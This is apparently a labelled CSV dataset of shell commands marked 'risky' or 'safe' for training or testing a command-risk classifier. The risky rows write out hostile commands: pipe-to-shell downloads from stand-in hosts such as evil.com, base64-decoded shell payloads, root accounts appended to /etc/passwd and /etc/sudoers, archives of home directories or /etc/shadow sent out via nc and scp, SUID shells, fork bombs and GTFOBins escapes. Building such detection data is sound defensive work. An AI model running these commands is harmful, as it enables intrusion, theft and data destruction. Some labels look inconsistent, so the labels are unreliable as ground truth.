command,label,source
wget -qO- http://10.0.0.9/install | sh,risky,synthetic
links -source http://evil.com/run | bash,risky,mitre-attack
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
echo cHduZWQ= | base64 -d | bash,risky,synthetic
wget -qO- http://10.0.0.9/install | bash,risky,synthetic
echo aGVsbG8= | base64 -d | sh,risky,synthetic
rm -rf __pycache__,risky,synthetic
systemctl kill -s SIGKILL docker,risky,mitre-attack
echo toor:x:0:0 >> /etc/sudoers,risky,synthetic
curl http://192.168.1.50/run.sh | sh,risky,synthetic
echo ZWNobyByb290 | base64 -d | bash,risky,synthetic
sudo rm -rf /var/log/*.gz,risky,mitre-attack
export LD_LIBRARY_PATH=$(cmd),risky,synthetic
vim -c ':!/bin/sh',risky,gtfobins
echo root2:x:0:0 >> /etc/sudoers,risky,synthetic
chmod -R 755 /home/user/public,risky,synthetic
curl -fsSL http://evil.com/install.sh | sudo bash,risky,mitre-attack
scp -r ~/.ssh user@remote:/tmp/keys_backup,risky,synthetic
export IFS=$(cmd),risky,synthetic
chmod 4777 /bin/bash,risky,synthetic
echo admin:x:0:0 >> /etc/sudoers,risky,synthetic
echo cHduZWQ= | base64 -d | sh,risky,synthetic
"eval ""$PAYLOAD""",risky,mitre-attack
curl https://evil.net/install.sh | sh,risky,synthetic
chmod -R 766 /srv,risky,synthetic
chmod -R 755 /opt/app,risky,synthetic
wget -qO- https://bad.org/run | sh,risky,synthetic
rm -rf uploads/,risky,synthetic
chmod -R 777 /opt/app,risky,synthetic
echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config,risky,mitre-attack
yarn cache clean --force,risky,mitre-attack
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
tar czf - /home/user | nc 10.0.0.5 4444,risky,mitre-attack
echo IyEvYmluL2Jhc2gK | base64 -d | sh,risky,synthetic
curl http://example.com/run.sh | bash,risky,synthetic
curl http://10.0.0.9/install.sh | sh,risky,synthetic
curl https://evil.net/x | sh,risky,synthetic
rm -rf tmp/*,risky,synthetic
curl http://pwn.example/x | sh,risky,synthetic
curl https://evil.net/payload | sh,risky,synthetic
rm -rf /tmp/test/*,risky,synthetic
curl http://evil.com/shell.sh -o /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh,risky,mitre-attack
export LD_PRELOAD=/tmp/lib.so,risky,synthetic
export LD_PRELOAD=/home/user/evil.so,risky,synthetic
chmod -R 766 /home/user/public,risky,synthetic
curl http://192.168.1.50/run.sh | sudo bash,risky,synthetic
curl http://pwn.example/setup.sh | sh,risky,synthetic
crontab -r,risky,mitre-attack
chmod 4000 /bin/busybox,risky,synthetic
docker run --privileged -it ubuntu bash,risky,mitre-attack
echo 'user:hash' >> /etc/passwd,risky,mitre-attack
chmod u+s /tmp/x,risky,synthetic
git clean -fdx,risky,mitre-attack
sudo iptables -F && sudo iptables -P INPUT DROP,risky,mitre-attack
curl http://10.0.0.9/payload | sh,risky,synthetic
curl http://192.168.1.50/install.sh | bash,risky,synthetic
chmod u+s /usr/bin/find,risky,synthetic
shred -u /tmp/sensitive.db,risky,mitre-attack
bash -c ':(){ :|:& };:',risky,mitre-attack
curl -s http://pwn.example.com/x | sh,risky,mitre-attack
chmod u+s /bin/bash,risky,synthetic
wget -qO- https://bad.org/install | sh,risky,synthetic
wget -qO- http://10.0.0.9/x.sh | sh,risky,synthetic
poweroff --force,risky,mitre-attack
chmod -R 777 .,risky,mitre-attack
chmod 4777 /usr/bin/find,risky,synthetic
chmod -R 777 /tmp/data,risky,synthetic
curl http://10.0.0.9/x | sudo bash,risky,synthetic
kill -STOP $(pgrep -u root),risky,mitre-attack
curl http://192.168.1.50/setup.sh | sh,risky,synthetic
chown root:root /tmp/x && chmod 4755 /tmp/x,risky,mitre-attack
scp /etc/shadow user@remote:/tmp/,risky,synthetic
tar -cvf - /home | nc 203.0.113.20 4444,risky,synthetic
rsync -av --delete /home/ user@remote:/mirror/,risky,synthetic
kill -9 $(pgrep python),risky,synthetic
"tar czf - /home/user | ssh user@remote ""cat > backup.tar.gz""",risky,synthetic
for pid in $(pgrep node); do kill -9 $pid; done,risky,synthetic
pkill -9 -f python,risky,synthetic
kill -9 $(pgrep -f nginx),risky,synthetic
wget -qO- http://evil.com/x.sh | bash,risky,synthetic
for pid in $(pgrep -f worker); do kill -9 $pid; done,risky,synthetic
kill -9 $(ps -ef | grep java | awk '{print $2}'),risky,synthetic
wget http://example.com/tool.tar.gz && tar xzf tool.tar.gz,risky,synthetic
wget http://example.com/pkg.tar.gz -O - | tar xz -C /opt,risky,synthetic
curl http://example.com/build.tar.gz -o build.tar.gz && tar -xzf build.tar.gz -C /usr/local,risky,synthetic
wget http://198.51.100.5/app.zip && unzip app.zip -d /opt/app,risky,synthetic
while true; do kill -9 1234; done,risky,synthetic
kill -9 -1,risky,mitre-attack
curl http://pwn.example/install.sh | sh,risky,synthetic
chmod -R 766 /var/www,risky,synthetic
pkill -9 node,risky,synthetic
chmod 4777 /bin/busybox,risky,synthetic
rsync -avz /var/www/ backupuser@203.0.113.10:/mnt/backup/,risky,synthetic
export IFS=/tmp/lib.so,risky,synthetic
systemctl force-reload nginx,risky,mitre-attack
chmod -R 766 .,risky,synthetic
chmod -R 755 /var/www,risky,synthetic
chmod -R 755 /tmp/data,risky,synthetic
curl http://10.0.0.9/payload | bash,risky,synthetic
curl http://example.com/payload | sudo bash,risky,synthetic
wget -qO- http://10.0.0.9/x.sh | bash,risky,synthetic
ip link set eth0 down,risky,mitre-attack
wget -qO- https://bad.org/install | bash,risky,synthetic
dd if=/dev/zero of=/tmp/big bs=1M count=2048,risky,mitre-attack
chmod -R 777 /var/www,risky,synthetic
kill -KILL 1,risky,mitre-attack
fallocate -l 20G /var/tmp/swap.img,risky,mitre-attack
rm -rf node_modules/.cache,risky,synthetic
chmod -R 755 /srv,risky,synthetic
docker run -v /:/host ubuntu bash,risky,mitre-attack
route del default gw 192.168.1.1,risky,mitre-attack
chmod -R 777 /srv,risky,synthetic
curl http://example.com/setup.sh | sudo bash,risky,synthetic
iptables -P INPUT ACCEPT,risky,mitre-attack
echo ':(){ :|:& };:' | bash,risky,mitre-attack
crontab -r && crontab -l,risky,mitre-attack
curl https://evil.net/x | bash,risky,synthetic
curl https://evil.net/run.sh | sudo bash,risky,synthetic
"awk 'BEGIN {system(""/bin/sh"")}'",risky,gtfobins
wget -qO- http://evil.com/run | bash,risky,synthetic
curl http://192.168.1.50/payload | bash,risky,synthetic
nsenter -t 1 -m -u -i -n -- bash,risky,mitre-attack
wget -qO- http://evil.com/run | sh,risky,synthetic
curl http://pwn.example/install.sh | bash,risky,synthetic
sudo rm -rf /opt/old-deploy,risky,mitre-attack
cat /etc/shadow,risky,mitre-attack
echo '*/5 * * * * /tmp/payload.sh' | crontab -,risky,mitre-attack
chmod 4755 /tmp/x,risky,synthetic
tar --checkpoint-action=exec='echo hacked',risky,gtfobins
eval $(cat /tmp/script.txt),risky,mitre-attack
curl http://example.com/install.sh | bash,risky,mitre-attack
iptables -F,risky,mitre-attack
echo toor:x:0:0 >> /etc/passwd,risky,synthetic
PATH=/tmp/evil:$PATH,risky,mitre-attack
kill -9 $(pgrep postgres),risky,mitre-attack
systemctl stop firewalld,risky,mitre-attack
chmod 4755 /bin/vi,risky,synthetic
echo aGVsbG8= | base64 -d | bash,risky,synthetic
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
mypy src/,safe,bash-history
awk -l,safe,synthetic
ll,safe,bash-history
systemctl | grep -i error,safe,synthetic
journalctl | grep -i success,safe,synthetic
nmap -p 22 localhost,safe,bash-history
docker | grep -i fail,safe,synthetic
npm outdated,safe,bash-history
exit,safe,bash-history
service nginx status,safe,bash-history
chown -R www-data:www-data /var/www/html,safe,bash-history
terraform apply -auto-approve,safe,bash-history
sudo pip,safe,synthetic
git diff,safe,bash-history
df -i,safe,bash-history
seq 1 100 | paste -sd+ | bc,safe,bash-history
tar --verbose,safe,synthetic
systemctl status nginx,safe,bash-history
time pip,safe,synthetic
mv /tmp,safe,synthetic
journalctl data/,safe,synthetic
git ~/.config,safe,synthetic
zip -l,safe,synthetic
pip /tmp,safe,synthetic
gcc -o hello hello.c,safe,bash-history
lsof -p 1234,safe,bash-history
dig example.com,safe,bash-history
gpasswd -a devuser docker,safe,bash-history
find ~/documents,safe,synthetic
git build/,safe,synthetic
awk /srv/www,safe,synthetic
apt ~/.config,safe,synthetic
apt --all,safe,synthetic
tcpdump -i any port 53 -c 10,safe,bash-history
systemctl list-sockets,safe,bash-history
chmod 644 config.json,safe,bash-history
curl -I https://example.com,safe,bash-history
du | grep -i fail,safe,synthetic
mv ~/documents,safe,synthetic
blkid,safe,bash-history
ufw status numbered,safe,bash-history
ip link show eth0,safe,bash-history
zip | grep -i success,safe,synthetic
cargo run,safe,bash-history
who,safe,bash-history
whois example.com | head -30,safe,bash-history
fail2ban-client status sshd,safe,bash-history
source ~/.bashrc,safe,bash-history
python3 main.py --port 8080,safe,bash-history
ls | grep -i warn,safe,synthetic
awk ~/documents,safe,synthetic
grep /var/log,safe,synthetic
docker build -t app:latest .,safe,bash-history
xargs -I{} echo item {},safe,bash-history
du --verbose,safe,synthetic
nc -vz localhost 3306,safe,bash-history
tar | grep -i warn,safe,synthetic
curl -H 'Accept: application/json' https://api.github.com/repos/cli/cli,safe,bash-history
w,safe,bash-history
journalctl /var/log,safe,synthetic
cargo test,safe,bash-history
zip -f,safe,synthetic
npm install,safe,bash-history
cp build/,safe,synthetic
awk --verbose,safe,synthetic
grep --verbose,safe,synthetic
cmake ..,safe,bash-history
find src/,safe,synthetic
printf 'name: %s\n' adhi,safe,bash-history
ls /tmp,safe,synthetic
head .,safe,synthetic
openssl x509 -in cert.pem -noout -text,safe,bash-history
nc -zv 10.0.0.1 22,safe,bash-history
git submodule update --init --recursive,safe,bash-history
df -l,safe,synthetic
dmesg | tail,safe,bash-history
df src/,safe,synthetic
systemctl | grep -i fail,safe,synthetic
df .,safe,synthetic
grep -a,safe,synthetic
zip data/,safe,synthetic
rustc --version,safe,bash-history
python --version,safe,bash-history
cat ~/.config,safe,synthetic
mkdir -p projects/backend/src,safe,bash-history
ufw allow 22/tcp,safe,bash-history
du .,safe,synthetic
zip --verbose,safe,synthetic
sudo deluser tempuser,safe,bash-history
crontab -l,safe,bash-history
systemctl /opt/app,safe,synthetic
pip | grep -i warn,safe,synthetic
less README.md,safe,bash-history
npm run build,safe,bash-history
mkdir src/,safe,synthetic
groupadd -g 1500 eng,safe,bash-history
man rsync,safe,bash-history
apt /srv/www,safe,synthetic
cp --all,safe,synthetic
cat | grep -i ok,safe,synthetic
awk src/,safe,synthetic
awk build/,safe,synthetic
journalctl | grep -i warn,safe,synthetic
locale -a,safe,bash-history
sync,safe,bash-history
curl -4 -s https://api.ipify.org,safe,bash-history
"sed -n '10,30p' access.log",safe,bash-history
cat ..,safe,synthetic
git pull origin main,safe,bash-history
grep | grep -i error,safe,synthetic
pip /var/log,safe,synthetic
uniq -c access.log | sort -rn | head,safe,bash-history
sudo systemctl start postgresql,safe,bash-history
passwd -l oldaccount,safe,bash-history
ssh-add ~/.ssh/id_ed25519,safe,bash-history
arp -a,safe,bash-history
parallel -j4 gzip ::: *.log,safe,bash-history
ssh user@server 'df -h',safe,bash-history
docker /tmp,safe,synthetic
tar /srv/www,safe,synthetic
journalctl -l,safe,synthetic
du | grep -i error,safe,synthetic
top,safe,bash-history
ifconfig,safe,bash-history
head --all,safe,synthetic
systemctl stop bluetooth,safe,bash-history
pip show numpy,safe,bash-history
tar -xzf archive.tar.gz -C /tmp,safe,bash-history
tshark -i eth0 -c 50,safe,bash-history
git --help,safe,synthetic
ps aux,safe,bash-history
zip -r backup.zip data/,safe,bash-history
git worktree add ../hotfix hotfix-branch,safe,bash-history
mv ..,safe,synthetic
scp -r ./backup user@server:/backups/,safe,bash-history
which python3,safe,bash-history
du -a,safe,synthetic
apt update,safe,bash-history
docker system df,safe,bash-history
pip | grep -i fail,safe,synthetic
screen -S deploy,safe,bash-history
git rebase main,safe,bash-history
brew services list,safe,bash-history
docker src/,safe,synthetic
pytest -q tests/ -x --cov=src,safe,bash-history
tar -l,safe,synthetic
ls -la,safe,bash-history
cp --verbose,safe,synthetic
systemctl .,safe,synthetic
cp -r assets dist/,safe,bash-history
ufw limit ssh,safe,bash-history
head /srv/www,safe,synthetic
kubectl get pods -n prod,safe,bash-history
ping -c 1 8.8.8.8,safe,bash-history
mount | column -t,safe,bash-history
systemctl ~/.config,safe,synthetic
env,safe,bash-history
mkdir ..,safe,synthetic
du /opt/app,safe,synthetic
apt list --installed,safe,bash-history
pip src/,safe,synthetic
mv | grep -i success,safe,synthetic
sed --all,safe,synthetic
"awk -F',' '{print $2}' data.csv | sort -u",safe,bash-history
kubectl port-forward svc/db 5432:5432,safe,bash-history
iotop -b -n 1,safe,bash-history
git cherry-pick abc1234,safe,bash-history
apt-get install --no-install-recommends -y curl,safe,bash-history
sed -i 's/old/new/g' file.txt,safe,bash-history
du build/,safe,synthetic
cat -f,safe,synthetic
cargo fmt --check,safe,bash-history
mv -v,safe,synthetic
apt | grep -i fail,safe,synthetic
git -a,safe,synthetic
ls ~/documents,safe,synthetic
lsmod,safe,bash-history
zip | grep -i warn,safe,synthetic
mkdir /srv/www,safe,synthetic
tar ~/documents,safe,synthetic
cp /opt/app,safe,synthetic
npm ci --frozen-lockfile,safe,bash-history
docker -a,safe,synthetic
apt -l,safe,synthetic
mkdir | grep -i warn,safe,synthetic
realpath .,safe,bash-history
openssl rand -hex 32,safe,bash-history
npm list --depth=0,safe,bash-history
df -h,safe,bash-history
nslookup google.com,safe,bash-history
awk | grep -i fail,safe,synthetic
journalctl .,safe,synthetic
awk | grep -i error,safe,synthetic
ip a,safe,bash-history
iptables -L -n -v,safe,bash-history
cat /srv/www,safe,synthetic
curl -s https://api.example.com/status,safe,bash-history
sudo systemctl enable nginx,safe,bash-history
pip build/,safe,synthetic
journalctl /srv/www,safe,synthetic
date,safe,bash-history
apt ..,safe,synthetic
grep /srv/www,safe,synthetic
sudo useradd -m testuser,safe,bash-history
route -n,safe,bash-history
journalctl ..,safe,synthetic
go test ./...,safe,bash-history
chown -R user:user /home/user/project,safe,bash-history
hostnamectl,safe,bash-history
npm audit fix --dry-run,safe,bash-history
tail -f /var/log/syslog,safe,bash-history
sed | grep -i error,safe,synthetic
apt /tmp,safe,synthetic
touch newfile.txt,safe,bash-history
stat /etc/nginx/nginx.conf,safe,bash-history
cp data/,safe,synthetic
sudo -l,safe,bash-history
pip install -r requirements.txt,safe,bash-history
chmod 600 ~/.ssh/id_rsa,safe,bash-history
grep -r error /var/log,safe,bash-history
zip ..,safe,synthetic
grep | grep -i success,safe,synthetic
sudo journalctl -u ssh --since 1 hour ago,safe,bash-history
chmod -R 750 /etc/nginx,safe,bash-history
docker ~/documents,safe,synthetic
git ..,safe,synthetic
ls -l /home/user,safe,bash-history
timedatectl,safe,bash-history
zip /opt/app,safe,synthetic
git /opt/app,safe,synthetic
pip | grep -i error,safe,synthetic
tmux new -s work,safe,bash-history
lspci,safe,bash-history
docker volume ls,safe,bash-history
pip list,safe,bash-history
git stash pop,safe,bash-history
chmod +x deploy.sh,safe,bash-history
pip data/,safe,synthetic
mv -l,safe,synthetic
time python script.py,safe,bash-history
cd ~,safe,bash-history
git checkout -b feature/new,safe,bash-history
sudo systemctl status sshd,safe,bash-history
apt -f,safe,synthetic
unzip release.zip -d /opt/app,safe,bash-history
systemctl /tmp,safe,synthetic
sudo apt upgrade -y --dry-run,safe,bash-history
ss -s,safe,bash-history
apt-get autoremove,safe,bash-history
sort -k2 -n data.csv,safe,bash-history
tar | grep -i error,safe,synthetic
git status --short --branch,safe,bash-history
docker compose up -d,safe,bash-history
sed data/,safe,synthetic
systemctl | grep -i warn,safe,synthetic
python3 -m venv .venv,safe,bash-history
journalctl -u nginx --since today,safe,bash-history
systemctl /var/log,safe,synthetic
modinfo usb_storage,safe,bash-history
htop,safe,bash-history
zip | grep -i ok,safe,synthetic
getfacl /srv/app,safe,bash-history
journalctl -xe,safe,bash-history
sudo apt list --upgradable,safe,bash-history
setfacl -m u:deploy:rwx /srv/app,safe,bash-history
sed --verbose,safe,synthetic
go build -o bin/app .,safe,bash-history
ls -lah /var/log | tail -20,safe,bash-history
docker push registry.local/app:latest,safe,bash-history
last -10,safe,bash-history
ls,safe,bash-history
fsck -n /dev/sdb1,safe,bash-history
npm start,safe,bash-history
git tag -l,safe,bash-history
history,safe,bash-history
getent group docker,safe,bash-history
mv old_name.py new_name.py,safe,bash-history
iostat -x 2,safe,bash-history
snap list,safe,bash-history
sleep 5 && echo done,safe,bash-history
apt show nginx,safe,bash-history
ip route,safe,bash-history
df /var/log,safe,synthetic
readlink -f /usr/bin/python3,safe,bash-history
du ~/documents,safe,synthetic
ip neigh,safe,bash-history
go version,safe,bash-history
du -l,safe,synthetic
awk /opt/app,safe,synthetic
awk --all,safe,synthetic
apt -a,safe,synthetic
ls --all,safe,synthetic
apt search postgres,safe,bash-history
pip freeze > requirements.lock,safe,bash-history
docker ~/.config,safe,synthetic
pwd,safe,bash-history
git | grep -i warn,safe,synthetic
ls | grep -i error,safe,synthetic
tar -czf backup.tar.gz /home/user/docs,safe,bash-history
docker -l,safe,synthetic
docker network ls,safe,bash-history
ruff check .,safe,bash-history
git stash,safe,bash-history
pip uninstall -y old-package,safe,bash-history
git /tmp,safe,synthetic
id,safe,bash-history
node -e 'console.log(process.version)',safe,bash-history
tar ~/.config,safe,synthetic
more notes.txt,safe,bash-history
terraform plan,safe,bash-history
pip ~/.config,safe,synthetic
userdel -r guest,safe,bash-history
docker images,safe,bash-history
head -l,safe,synthetic
mv /var/log,safe,synthetic
python manage.py collectstatic --noinput,safe,bash-history
mkdir build/,safe,synthetic
journalctl -u docker.service -n 30,safe,bash-history
df --verbose,safe,synthetic
diff -u old.py new.py,safe,bash-history
locate nginx.conf,safe,bash-history
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -,safe,bash-history
cd /var/log,safe,bash-history
du --all,safe,synthetic
pip install requests,safe,bash-history
cat | grep -i fail,safe,synthetic
ss -tulpn,safe,bash-history
sed -f,safe,synthetic
cat /opt/app,safe,synthetic
apt src/,safe,synthetic
cp | grep -i ok,safe,synthetic
lastb,safe,bash-history
sudo groupadd developers,safe,bash-history
git /srv/www,safe,synthetic
cp config.example.yml config.yml,safe,bash-history
ip addr,safe,bash-history
docker -f,safe,synthetic
apt | grep -i success,safe,synthetic
find . -name '*.py',safe,bash-history
sar -u 1 3,safe,bash-history
telnet localhost 5432,safe,bash-history
cargo build --release,safe,bash-history
tar | grep -i ok,safe,synthetic
nft list ruleset,safe,bash-history
du | grep -i ok,safe,synthetic
mv data/,safe,synthetic
cat /etc/os-release,safe,bash-history
mkdir | grep -i fail,safe,synthetic
git reflog -10,safe,bash-history
git -l,safe,synthetic
pip | grep -i ok,safe,synthetic
lsblk,safe,bash-history
git --all,safe,synthetic
"git blame src/main.py -L 40,60",safe,bash-history
whoami,safe,bash-history
kubectl logs deployment/api --tail=100,safe,bash-history
curl -sI https://status.github.com,safe,bash-history
systemctl mask bluetooth.service,safe,bash-history
systemctl list-timers,safe,bash-history
cut -d: -f1 /etc/passwd | sort,safe,bash-history
docker /var/log,safe,synthetic
ls ~/.config,safe,synthetic
sudo apt install -y build-essential,safe,bash-history
docker compose logs --tail 50,safe,bash-history
node --version,safe,bash-history
du -sh /home/user,safe,bash-history
tar .,safe,synthetic
getent passwd devuser,safe,bash-history
zip -a,safe,synthetic
chmod 640 config/database.yml,safe,bash-history
head | grep -i warn,safe,synthetic
iptables -S,safe,bash-history
systemctl daemon-reload,safe,bash-history
rg 'TODO' src/,safe,bash-history
du ..,safe,synthetic
mkdir | grep -i error,safe,synthetic
mkdir /var/log,safe,synthetic
cp .,safe,synthetic
journalctl src/,safe,synthetic
tree -L 2,safe,bash-history
git | grep -i error,safe,synthetic
tar | grep -i fail,safe,synthetic
sed /tmp,safe,synthetic
find --all,safe,synthetic
sudo du,safe,synthetic
time mkdir,safe,synthetic
npx tsc --noEmit,safe,bash-history
echo 'working' && mv,safe,synthetic
systemctl -v,safe,synthetic
clear,safe,bash-history
cat -v,safe,synthetic
grep -i 'failed' auth.log,safe,bash-history
tar --help,safe,synthetic
sudo git,safe,synthetic
cp /var/log,safe,synthetic
df --help,safe,synthetic
ls | grep -i fail,safe,synthetic
pip --all,safe,synthetic
dig -x 8.8.8.8,safe,bash-history
grep ~/.config,safe,synthetic
lsusb,safe,bash-history
systemctl data/,safe,synthetic
sudo docker,safe,synthetic
docker -v,safe,synthetic
free -h,safe,bash-history
free -m,safe,bash-history
time du,safe,synthetic
mkdir --help,safe,synthetic
zip --help,safe,synthetic
sudo sed,safe,synthetic
time cat,safe,synthetic
tar data/,safe,synthetic
echo 'working' && docker,safe,synthetic
pip --verbose,safe,synthetic
sudo df,safe,synthetic
cp -a,safe,synthetic
ps aux | grep python,safe,bash-history
grep | grep -i fail,safe,synthetic
mkdir -f,safe,synthetic
ls .,safe,synthetic
df /opt/app,safe,synthetic
mpstat -P ALL 1,safe,bash-history
du | grep -i success,safe,synthetic
du --help,safe,synthetic
sed -l,safe,synthetic
echo 'working' && pip,safe,synthetic
apt /var/log,safe,synthetic
find /home/user -type f -name '*.log',safe,bash-history
echo 'working' && ls,safe,synthetic
pip --help,safe,synthetic
echo $HOME,safe,bash-history
sudo cat,safe,synthetic
cat .,safe,synthetic
apt | grep -i error,safe,synthetic
mv | grep -i fail,safe,synthetic
git | grep -i ok,safe,synthetic
mkdir | grep -i success,safe,synthetic
git --verbose,safe,synthetic
docker rm $(docker ps -aq --filter status=exited),safe,bash-history
sudo find,safe,synthetic
black --check src/,safe,bash-history
sed /var/log,safe,synthetic
git -v,safe,synthetic
time mv,safe,synthetic
sed | grep -i fail,safe,synthetic
ls /var/log,safe,synthetic
cat data/,safe,synthetic
patch -p1 < fix.diff,safe,bash-history
export PATH=$PATH:/opt/bin,safe,bash-history
grep data/,safe,synthetic
sudo cp,safe,synthetic
time cp,safe,synthetic
cp -v,safe,synthetic
helm list,safe,bash-history
find | grep -i ok,safe,synthetic
du -f,safe,synthetic
time zip,safe,synthetic
ls -a,safe,synthetic
df | grep -i error,safe,synthetic
mv -a,safe,synthetic
docker --verbose,safe,synthetic
tar -a,safe,synthetic
smartctl -a /dev/sda,safe,bash-history
time apt,safe,synthetic
lsof -i :8080,safe,bash-history
sed ~/documents,safe,synthetic
git fetch origin,safe,bash-history
npx prettier --write .,safe,bash-history
python app.py,safe,bash-history
head | grep -i success,safe,synthetic
service postgresql restart,safe,bash-history
find /tmp,safe,synthetic
ls --verbose,safe,synthetic
nmcli con show --active,safe,bash-history
lsblk -f,safe,bash-history
sudo apt,safe,synthetic
head /opt/app,safe,synthetic
sudo mkdir,safe,synthetic
time docker,safe,synthetic
journalctl -a,safe,synthetic
time df,safe,synthetic
find -v,safe,synthetic
mkdir -v,safe,synthetic
git push,safe,bash-history
echo 'working' && apt,safe,synthetic
echo 'working' && find,safe,synthetic
df --all,safe,synthetic
echo 'working' && grep,safe,synthetic
apt -v,safe,synthetic
awk | grep -i warn,safe,synthetic
find | grep -i error,safe,synthetic
dhclient -r eth0,safe,bash-history
find --help,safe,synthetic
pip -f,safe,synthetic
df ..,safe,synthetic
time grep,safe,synthetic
cp | grep -i error,safe,synthetic
time journalctl,safe,synthetic
dig +short example.com A,safe,bash-history
zip -v,safe,synthetic
git ~/documents,safe,synthetic
mv --help,safe,synthetic
ls ..,safe,synthetic
cp | grep -i fail,safe,synthetic
awk --help,safe,synthetic
awk /tmp,safe,synthetic
tar | grep -i success,safe,synthetic
echo 'working' && systemctl,safe,synthetic
cp -f,safe,synthetic
sudo mv,safe,synthetic
sudo systemctl,safe,synthetic
time git,safe,synthetic
cat --all,safe,synthetic
echo 'working' && du,safe,synthetic
tar --all,safe,synthetic
grep -v,safe,synthetic
sudo zip,safe,synthetic
pip ..,safe,synthetic
pip | grep -i success,safe,synthetic
apt-mark hold linux-image-generic,safe,bash-history
sed /opt/app,safe,synthetic
time awk,safe,synthetic
cp --help,safe,synthetic
echo 'working' && git,safe,synthetic
journalctl | grep -i ok,safe,synthetic
checksum=$(sha256sum app.iso | cut -d' ' -f1),safe,bash-history
grep --help,safe,synthetic
awk data/,safe,synthetic
head -v,safe,synthetic
tar -v,safe,synthetic
du -sh * | sort -rh | head -10,safe,bash-history
flatpak list,safe,bash-history
watch -n 2 'df -h',safe,bash-history
df -v,safe,synthetic
head --help,safe,synthetic
yes | head -10,safe,bash-history
journalctl --disk-usage,safe,bash-history
journalctl --help,safe,synthetic
hostname,safe,bash-history
awk '{print $1}' access.log,safe,bash-history
apt --help,safe,synthetic
uname -a,safe,bash-history
journalctl -v,safe,synthetic
cp | grep -i success,safe,synthetic
cat file.txt,safe,bash-history
time systemctl,safe,synthetic
echo 'working' && journalctl,safe,synthetic
mkdir /tmp/test,safe,bash-history
zip /var/log,safe,synthetic
cat --help,safe,synthetic
time find,safe,synthetic
zip --all,safe,synthetic
time tar,safe,synthetic
echo 'working' && tar,safe,synthetic
journalctl | grep -i fail,safe,synthetic
echo 'working' && head,safe,synthetic
systemctl | grep -i ok,safe,synthetic
awk -v,safe,synthetic
sudo awk,safe,synthetic
sed /srv/www,safe,synthetic
head ~/.config,safe,synthetic
find --verbose,safe,synthetic
echo hello world,safe,bash-history
sed --help,safe,synthetic
echo 'working' && df,safe,synthetic
grep /opt/app,safe,synthetic
echo 'working' && cp,safe,synthetic
mv src/,safe,synthetic
sudo head,safe,synthetic
grep ..,safe,synthetic
docker tag app:latest app:1.2.3,safe,bash-history
python manage.py createsuperuser --username admin,safe,bash-history
sudo journalctl,safe,synthetic
make,safe,bash-history
mkdir .,safe,synthetic
apt install curl,safe,synthetic
apt remove nginx,safe,synthetic
awk -f,safe,synthetic
head | grep -i fail,safe,synthetic
sudo grep,safe,synthetic
yarn add lodash,safe,bash-history
cat | grep -i warn,safe,synthetic
cal 2026,safe,bash-history
pip -v,safe,synthetic
du /var/log,safe,synthetic
mtr -r 8.8.8.8,safe,bash-history
systemctl list-units,safe,bash-history
cp /srv/www,safe,synthetic
du data/,safe,synthetic
sed | grep -i ok,safe,synthetic
journalctl -u fail2ban --since today,safe,bash-history
find -f,safe,synthetic
time head,safe,synthetic
ls -v,safe,synthetic
ssh-keygen -t ed25519 -C 'dev',safe,bash-history
git -f,safe,synthetic
vmstat 1 5,safe,bash-history
blkid -s UUID /dev/sda1,safe,bash-history
git push origin main,safe,bash-history
du -v,safe,synthetic
git commit -m 'fix: bug',safe,bash-history
systemctl --verbose,safe,synthetic
cp ~/documents,safe,synthetic
head -20 access.log,safe,bash-history
traceroute -n 1.1.1.1,safe,bash-history
fuser -v /var/log,safe,bash-history
find ~/.config,safe,synthetic
"git commit -m ""fix bug in parser""",safe,bash-history
cd /var/www,safe,bash-history
ls -lh /var/log,safe,bash-history
apt .,safe,synthetic
ping -c 4 google.com,safe,bash-history
ls -l,safe,synthetic
ls --help,safe,synthetic
head | grep -i error,safe,synthetic
cat | grep -i success,safe,synthetic
traceroute 8.8.8.8,safe,bash-history
docker exec -it app python manage.py migrate,safe,bash-history
nmcli device status,safe,bash-history
cal,safe,synthetic
man ls,safe,synthetic
apt-get install -y python3-pip,safe,synthetic
apt-get update,safe,synthetic
make -j4,safe,bash-history
journalctl -f,safe,synthetic
git log --oneline -10,safe,bash-history
dstat --cpu --mem 2 5,safe,bash-history
cp /tmp,safe,synthetic
cat | grep -i error,safe,synthetic
docker | grep -i ok,safe,synthetic
mkdir | grep -i ok,safe,synthetic
ansible-playbook -i hosts site.yml --check,safe,bash-history
sed -v,safe,synthetic
